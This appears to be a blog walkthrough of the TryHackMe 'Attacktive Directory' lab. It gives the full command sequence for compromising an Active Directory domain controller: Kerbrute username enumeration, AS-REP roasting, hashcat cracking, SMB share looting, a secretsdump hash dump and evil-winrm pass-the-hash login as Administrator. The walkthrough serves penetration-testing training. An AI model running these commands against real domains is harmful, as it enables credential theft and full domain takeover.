---
published: true
title: Attacktive Directory - TryHackMe Walkthrough
category: Writeup
image: 'https://imgur.com/VBtI2jq.png'
author: F3dai
---
Attacktive Directory - "99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?" This is a TryHackMe box. To access this you must sign up to [https://tryhackme.com/](https://tryhackme.com/).

**URL:** [Year of the Rabbit](https://www.tryhackme.com/room/yearoftherabbit)

**Difficulty:** Medium

**Author:** Sq00ky

## Enumeration

We are given the IP 10.10.62.162. Run an nmap scan with the following command:

<pre>nmap -p- -A -o portscan 10.10.113.38</pre>

Here are the open ports:

<pre></pre>

Let's visit port 80:

![port 80](https://imgur.com/vsNyWnX.png)

The image on this page is a link to the following website:

[https://www.iis.net/?utm_medium=iis-deployment](https://www.iis.net/?utm_medium=iis-deployment)

We already know this box will be based around Internet Information Services (IIS). 

<pre>PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-16 15:45:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2020-06-16T15:47:30+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2020-04-03T18:40:09
|_Not valid after:  2020-10-03T18:40:09
|_ssl-date: 2020-06-16T15:47:44+00:00; +2s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49793/tcp open  msrpc         Microsoft Windows RPC</pre>

A lot of ports open which seem to all point towards an Active Directory environment. 

We can see **Kerberos** running on port 88 which is an authentication protocol. This is currently the default authentication technology used by Microsoft to authenticate users to services within a local area network.

Port 445 is also open which indicates a service called the server message block (SMB) over TCP/IP.

Whenever ports 139 and 445 are open, I always start by using **enum4linux** to enumerate.

<pre>enum4linux -A 10.10.113.38</pre>

![enum4linux](https://imgur.com/MbN6yLQ.png)

We've got some interesting information back. We've identified some known usernames:

<pre>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</pre>

And also a domain name:

<pre>Domain Name: THM-AD</pre>

I will be installing a tool called **Kerbrute**. This essentially **bruteforces** and enumerates valid Active Directory accounts through Kerberos Pre-Authentication, since enum4linux failed to get us any valid credentials.

[Kerbrute - Github](https://github.com/ropnop/kerbrute)

Let's install this tool on the local machine with [golang](https://www.ostechnix.com/install-go-language-linux/)

The challenge provides us with a username and password, let's download them both onto our local machine:

<pre>wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt</pre>

Now we can attempt to brute with kerberos:

<pre>cd ~/go/bin
./kerbrute userenum --dc 10.10.156.50 -d 10.10.156.50 ../../TryHackMe/Attacktive_Directory/userlist.txt -t 100</pre>

![errors](https://imgur.com/nRX6cLo.png)

As you can see, I got a lot of errors when running this command (I like to include errors and mistakes to illustrate how I approach problems).

The error said "KDC ERROR - Wrong Realm. **Try adjusting the domain**? Aborting...". Look back a few steps to the nmap scan and we see the domain name as "spookysec.local":

![nmap](https://imgur.com/i1pz2EJ.png)

Let's put this in our /etc/hosts file, since we are practicing on a local network:

<pre>echo "10.10.62.162 spookysec.local" >> /etc/hosts</pre>

Now we can re-attempt the kerbrute brute force:

<pre>./kerbrute userenum --dc spookysec.local -d spookysec.local ../../TryHackMe/Attacktive_Directory/userlist.txt -t 100</pre>

After a few minutes, we have a list of usernames:

![kerbrute results](https://imgur.com/rZEhXhU.png)

<pre>2020/06/17 05:04:43 >  Using KDC(s):
2020/06/17 05:04:43 >   spookysec.local:88

2020/06/17 05:51:27 >  [+] VALID USERNAME:       james@spookysec.local
2020/06/17 05:51:28 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2020/06/17 05:51:28 >  [+] VALID USERNAME:       James@spookysec.local
2020/06/17 05:51:28 >  [+] VALID USERNAME:       robin@spookysec.local
2020/06/17 05:51:28 >  [+] VALID USERNAME:       darkstar@spookysec.local
2020/06/17 05:51:29 >  [+] VALID USERNAME:       administrator@spookysec.local
2020/06/17 05:51:29 >  [+] VALID USERNAME:       backup@spookysec.local
2020/06/17 05:51:29 >  [+] VALID USERNAME:       paradox@spookysec.local
2020/06/17 05:51:35 >  [+] VALID USERNAME:       JAMES@spookysec.local
2020/06/17 05:51:36 >  [+] VALID USERNAME:       Robin@spookysec.local
2020/06/17 05:51:40 >  [+] VALID USERNAME:       Administrator@spookysec.local
2020/06/17 05:51:48 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2020/06/17 05:51:51 >  [+] VALID USERNAME:       Paradox@spookysec.local
2020/06/17 05:52:02 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2020/06/17 05:52:04 >  [+] VALID USERNAME:       ori@spookysec.local
2020/06/17 05:52:09 >  [+] VALID USERNAME:       ROBIN@spookysec.local</pre>

The **svc-admin** and **Administrator** users look interesting.

## Exploiting Kerberos

We now want to crack Active Directory passwords with AS-REP Roasting. This is an attack against Kerberos for user accounts that do not require preauthentication. This attack is explained nicely on this article:

[Roasting AS-REPs](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)

Pre-authentication is the first step in Kerberos authentication, and is designed to prevent brute-force password guessing attacks. 

Although it's unlikely accounts are ever set up without pre-authentication, it is always possible to find these vulnerable users. 

![kerboros config](https://imgur.com/CJsdr6X.png)

I will be using GetNPUsers.py to retrieve a kerberos ticket (TGT), and attempt to decrypt it. This may pre-installed on your machine, you can find the path with this command:

<pre>find / -type f -name 'GetNPUsers.py'</pre>

If not, here is a link to the script:

[GetNPUsers.py - guthub](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)

This is a great youtube video I used to understand this script:

[GetNPUsers & Kerberos Pre-Auth Explained - Youtube](https://www.youtube.com/watch?time_continue=6&v=pZSyGRjHNO4&feature=emb_title)

Let's try this out with the two interesting users we validated earlier:

**Administrator**:

<pre>python GetNPUsers.py spookysec.local/Administrator</pre>

![GetNPUsers admin](https://imgur.com/yk0Tkig.png)

This user doesn't seem vulnerable.

**svc-admin**:

<pre>python GetNPUsers.py spookysec.local/svc-admin</pre>

![GetNPUsers](https://imgur.com/pYn2f4H.png)

Great, we have the following result:

<pre>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:c2a[REMOVED]e19</pre>

Let's save this to a file called "hash.txt".

This is a hash value we can attempt to crack using the wordlist they provided in the challenge. I will be using **hashcat**.

<pre>hashcat -m 18200 hash.txt passwordlist.txt --force</pre>

"-m 18200" specifies the "mode" we want to use. Use the Hashcat Wiki to read all the different modes when cracking hash values:

[Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=example_hashes)

![hashcat wiki](https://imgur.com/VRM3GHg.png)

Running the hashcat command gives us a password.

![hashcat result](https://imgur.com/ScFglh0.png)

## Enumerating the Domain Controller

We have some credentials, we have more access within the domain. We want to map the remote SMB shares with **smbclient**.

<pre>smbclient -L spookysec.local --user svc-admin</pre>

![smbclient map shares](https://imgur.com/xvhcEVl.png)

Result:

<pre>        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
</pre>

The share "**backup**" seems interesting. Let's explore this.

<pre>smbclient \\\\spookysec.local\\backup --user svc-admin
ls</pre>

![ls smbclient](https://imgur.com/nNIjbgQ.png)

There is a file called "backup_credentials.txt", this could be the credentials to another user we identified earlier. Transfer this to your local machine.

<pre>get backup_credentials.txt</pre>

This looks like it has been encrypted. I used cyberchef to identify and decrypt the hash value:

[CyberChef](https://gchq.github.io/CyberChef)

![Cyber Chef Base64 Decode](https://imgur.com/Q8xIHRT.png)

<pre>backup@spookysec.local:b***********0</pre>

## Elevating Privileges

Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account "backup" gets us thinking. What is this the backup account to?

"Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes.

Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain."

^ Taken from the challenge.

We can now attempt to enumerate additional user information, hopefully with NTLM hashes. So let's use secretdump.py to do this. 

Here is a link to the secretdump.py script:

[secretdump.py - Github](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)

If you followed the impacket installation steps on TryHackMe, the python file will be located here:

<pre>/opt/impacket/examples</pre>

<pre>secretsdump.py -just-dc backup@spookysec.local</pre>

![results](https://imgur.com/iWDsXxq.png)

We now have a dump of the DC hashes, including the Administrator password hash.

<pre>Administrator:500:aad3b435b51404eeaad3b435b51404ee:e******************************b:::</pre>

We can now either decrypt the NTLM hash and connect as Administrator, or use **evil-winrm**.

**WinRM** (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.

<pre>evil-winrm -i 10.10.156.50 -u Administrator -H e******************************b</pre>

![evil winrm](https://imgur.com/JxLTDA6.png)

Now we are logged in as the Administrator. Each flag is located in the user's Desktop directory.

